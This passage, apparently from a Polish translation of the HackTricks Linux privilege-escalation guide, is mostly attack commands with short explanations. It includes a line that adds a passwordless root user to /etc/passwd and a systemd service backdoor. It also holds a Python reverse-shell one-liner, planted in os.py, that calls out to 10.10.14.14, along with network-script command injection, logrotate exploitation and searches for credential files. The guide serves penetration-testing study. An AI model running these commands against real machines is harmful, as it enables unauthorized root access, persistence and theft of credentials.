OSTRZEŻENIE: może to obniżyć obecną ochronę maszyny.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
**UWAGA:** Na platformach BSD plik `/etc/passwd` znajduje się pod ścieżką `/etc/pwd.db` i `/etc/master.passwd`, a plik `/etc/shadow` został przemianowany na `/etc/spwd.db`.

Należy sprawdzić, czy można **zapisywać w pewnych wrażliwych plikach**. Na przykład, czy można zapisać w pewnym **pliku konfiguracyjnym usługi**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na przykład, jeśli maszyna uruchamia serwer **tomcat** i możesz **modyfikować plik konfiguracyjny usługi Tomcat wewnątrz /etc/systemd/**, to możesz zmodyfikować linie:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Twoje tylne drzwi zostaną uruchomione następnym razem, gdy zostanie uruchomiony tomcat.

### Sprawdź Foldery

Następujące foldery mogą zawierać kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie będziesz w stanie odczytać ostatniego, ale spróbuj)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Dziwne lokalizacje/Pliki posiadane
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Zmodyfikowane pliki w ciągu ostatnich minut
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Pliki bazy danych Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### Pliki \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Ukryte pliki
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skrypty/Binaries w PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Pliki internetowe**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Kopie zapasowe**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Znane pliki zawierające hasła

Przeczytaj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), który wyszukuje **kilka możliwych plików, które mogą zawierać hasła**.\
**Inne interesujące narzędzie**, które możesz użyć do tego celu, to: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), które jest aplikacją open source służącą do odzyskiwania wielu haseł przechowywanych na komputerze lokalnym w systemach Windows, Linux i Mac.

### Dzienniki

Jeśli potrafisz czytać dzienniki, możesz znaleźć w nich **interesujące/poufne informacje**. Im dziwniejszy jest dziennik, tym bardziej interesujący będzie (prawdopodobnie).\
Ponadto, niektóre "**źle**" skonfigurowane (z backdoorem?) **dzienniki audytu** mogą pozwolić Ci **zapisywać hasła** w dziennikach audytu, jak wyjaśniono w tym poście: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Aby **czytać dzienniki grupy** [**adm**](interesujące-grupy-linux-pe/#grupa-adm) będą naprawdę pomocne.

### Pliki powłoki
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Ogólne wyszukiwanie danych uwierzytelniających/Regex

Należy również sprawdzić pliki zawierające słowo "**password**" w nazwie lub w treści, a także sprawdzić adresy IP i maile w logach, lub wyrażenia regularne dla hashy.\
Nie zamierzam tutaj wymieniać, jak to zrobić, ale jeśli jesteś zainteresowany, możesz sprawdzić ostatnie sprawdzenia, które wykonuje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Pliki z możliwością zapisu

### Przechwytywanie biblioteki Pythona

Jeśli wiesz **skąd** będzie uruchamiany skrypt w języku Python i **możesz pisać wewnątrz** tego folderu lub **modyfikować biblioteki Pythona**, możesz zmodyfikować bibliotekę systemową i umieścić w niej backdoor (jeśli możesz pisać tam, gdzie będzie uruchamiany skrypt w Pythonie, skopiuj i wklej bibliotekę os.py).

Aby **umieścić backdoor w bibliotece**, wystarczy dodać na końcu biblioteki os.py następującą linię (zmień IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Wykorzystanie logrotate

Podatność w `logrotate` pozwala użytkownikom z **uprawnieniami do zapisu** do pliku dziennika lub jego katalogów nadrzędnych potencjalnie uzyskać podwyższone uprawnienia. Dzieje się tak, ponieważ `logrotate`, często uruchamiany jako **root**, może być manipulowany w celu wykonania dowolnych plików, zwłaszcza w katalogach takich jak _**/etc/bash\_completion.d/**_. Ważne jest sprawdzenie uprawnień nie tylko w _/var/log_, ale także w dowolnym katalogu, w którym stosowane jest obracanie logów.

{% hint style="info" %}
Ta podatność dotyczy wersji `logrotate` `3.18.0` i starszych
{% endhint %}

Szczegółowe informacje na temat podatności można znaleźć na tej stronie: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Możesz wykorzystać tę podatność za pomocą [**logrotten**](https://github.com/whotwagner/logrotten).

Ta podatność jest bardzo podobna do [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(dzienniki nginx)**, więc gdy tylko zauważysz, że możesz zmieniać dzienniki, sprawdź, kto nimi zarządza, i sprawdź, czy możesz uzyskać wyższe uprawnienia, podmieniając dzienniki na dowiązania symboliczne.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Odwołanie do podatności:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

Jeśli z jakiegoś powodu użytkownik jest w stanie **zapisać** skrypt `ifcf-<cokolwiek>` do _/etc/sysconfig/network-scripts_ **lub** może **dostosować** istniejący, to **twój system jest skompromitowany**.

Skrypty sieciowe, np. _ifcg-eth0_, są używane do połączeń sieciowych. Wyglądają dokładnie jak pliki .INI. Jednakże są one \~załączane\~ na Linuxie przez Menedżera Sieci (dispatcher.d).

W moim przypadku atrybut `NAME=` w tych skryptach sieciowych nie jest obsługiwany poprawnie. Jeśli masz **białą/przerwę w nazwie, system próbuje wykonać część po białej/przerwie**. Oznacza to, że **wszystko po pierwszej białej/przerwie jest wykonywane jako root**.

Na przykład: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd oraz rc.d**

Katalog `/etc/init.d` jest domem dla **skryptów** Systemu V init (SysVinit), klasycznego systemu zarządzania usługami w systemie Linux. Zawiera skrypty do `startowania`, `zatrzymywania`, `restartowania` oraz czasami `przeładowywania` usług. Mogą być wykonywane bezpośrednio lub poprzez linki symboliczne znajdujące się w `/etc/rc?.d/`. Alternatywną ścieżką w systemach Redhat jest `/etc/rc.d/init.d`.

Z kolei `/etc/init` jest związane z **Upstart**, nowszym **systemem zarządzania usługami** wprowadzonym przez Ubuntu, używającym plików konfiguracyjnych do zadań zarządzania usługami. Pomimo przejścia na Upstart, skrypty SysVinit są wciąż wykorzystywane obok konfiguracji Upstart ze względu na warstwę kompatybilności w Upstart.

**systemd** pojawia się jako nowoczesny inicjalizator i menedżer usług, oferujący zaawansowane funkcje takie jak uruchamianie demona na żądanie, zarządzanie automatycznym montowaniem oraz tworzenie migawek stanu systemu. Organizuje pliki w `/usr/lib/systemd/` dla pakietów dystrybucyjnych oraz `/etc/systemd/system/` dla modyfikacji administratora, usprawniając proces administracji systemem.

## Inne Triki

### Eskalacja uprawnień NFS

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Ucieczka z ograniczonych powłok

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Zabezpieczenia jądra

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Więcej pomocy

[Statyczne binaria impacket](https://github.com/ropnop/impacket\_static\_binaries)

## Narzędzia do eskalacji uprawnień w Linuxie/Unixie

### **Najlepsze narzędzie do szukania wektorów eskalacji uprawnień lokalnych w Linuxie:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Wyliczanie podatności jądra w systemach Linux i MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (dostęp fizyczny):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Kompilacja więcej skryptów**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referencje

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

{% hint style="success" %}
Naucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
